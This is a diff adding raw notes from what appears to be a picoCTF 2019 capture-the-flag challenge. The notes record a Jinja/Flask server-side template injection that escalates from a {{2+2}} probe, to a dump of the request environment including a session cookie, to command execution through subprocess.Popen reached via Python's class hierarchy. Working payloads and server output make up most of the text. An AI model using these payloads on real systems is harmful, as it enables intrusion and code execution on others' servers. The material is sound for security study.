@@ -1,0 +1,52 @@
+
+{{2+2}}
+4
+
+{{request.environ}}
+
+{'REQUEST_METHOD': 'GET', 'REQUEST_URI': '/list_items', 'PATH_INFO':
+'/list_items', 'QUERY_STRING': '', 'SERVER_PROTOCOL': 'HTTP/1.1', 'SCRIPT_NAME':
+'', 'SERVER_NAME': 'pico-2019-shell1', 'SERVER_PORT': '45132', 'REMOTE_ADDR':
+'0.0.0.0', 'HTTP_HOST': '2019shell1.picoctf.com:45132', 'HTTP_USER_AGENT':
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101
+Firefox/69.0', 'HTTP_ACCEPT':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+'HTTP_ACCEPT_LANGUAGE': 'uk,en-US;q=0.7,en;q=0.3', 'HTTP_ACCEPT_ENCODING':
+'gzip, deflate', 'HTTP_REFERER': 'http://2019shell1.picoctf.com:45132/add_item',
+'HTTP_DNT': '1', 'HTTP_CONNECTION': 'keep-alive', 'HTTP_COOKIE':
+'session=.eJwlz12qAjEMQOG99NmHNs1f3cyQJimKoDCjT5e7dwdcwAfn_JVt7XncyvW9f_JStnuUa2kJWjXC1kJd4VJrVWGMMVQ7-iSMCQMpK3UiCzPz1swA3LJbYwZuLtZ1-EgMEnI07nN5j6B6-mDB6dwBYQQwdqspSyQMo1yKH_va3q9HPs-eSm7oMNYgDoYWaVXVYxGATPYmHA2JTvc5cv9NMJb_Lws_P0s.XZkFOw.-oRdb4Zo1X-U7W5CJ1A_W3Ul7J8',
+'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 'HTTP_CACHE_CONTROL': 'max-age=0',
+'wsgi.input': <uwsgi._Input object at 0x7fcf6efdaf00>, 'wsgi.file_wrapper':
+<built-in function uwsgi_sendfile>, 'wsgi.version': (1, 0), 'wsgi.errors':
+<_io.TextIOWrapper name=2 mode='w' encoding='UTF-8'>, 'wsgi.run_once': False,
+'wsgi.multithread': False, 'wsgi.multiprocess': False, 'wsgi.url_scheme':
+'http', 'uwsgi.version': b'2.0.15-debian', 'uwsgi.node': b'pico-2019-shell1',
+'werkzeug.request': <Request 'http://2019shell1.picoctf.com:45132/list_items'
+[GET]>}
+
+{{[].__class__.__mro__[1].__subclasses__()[287]}}
+<class 'subprocess.Popen'>
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("id", stdout=-1).communicate()}}
+b'uid=8515(empire3_4) gid=8516(empire3_4) groups=8516(empire3_4)\n'
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("ls -la", shell=1, stdout=-1, stderr=-1).communicate()}}
+total 88
+drwxr-x--- 3 hacksports empire3_4 4096 Oct 3 03:35 .
+drwxr-x--x 684 root root 69632 Oct 3 00:56 ..
+drwxr-xr-x 3 root root 4096 Sep 28 21:35 app
+-rw-rw-r-- 1 hacksports hacksports 61 Sep 28 21:35 server.py
+-rwxr-sr-x 1 hacksports empire3_4 105 Oct 3 03:35 xinet_startup.sh
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("ls -la app", shell=1, stdout=-1, stderr=-1).communicate()}}
+total 36
+drwxr-xr-x 3 root root 4096 Sep 28 21:35 .
+drwxr-x--- 3 hacksports empire3_4 4096 Oct 3 03:35 ..
+-rw-rw-r-- 1 hacksports hacksports 1618 Sep 28 21:35 __init__.py
+-rw-rw-r-- 1 hacksports hacksports 333 Sep 28 21:35 config.py
+-rw-rw-r-- 1 hacksports hacksports 1382 Sep 28 21:35 helpers.py
+-rw-rw-r-- 1 hacksports hacksports 1124 Sep 28 21:35 models.py
+-rw-rw-r-- 1 hacksports hacksports 5917 Sep 28 21:35 routes.py
+drwxr-xr-x 2 root root 4096 Sep 28 21:35 templates
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("grep -r picoCTF", shell=1, stdout=-1, stderr=-1).communicate()}}
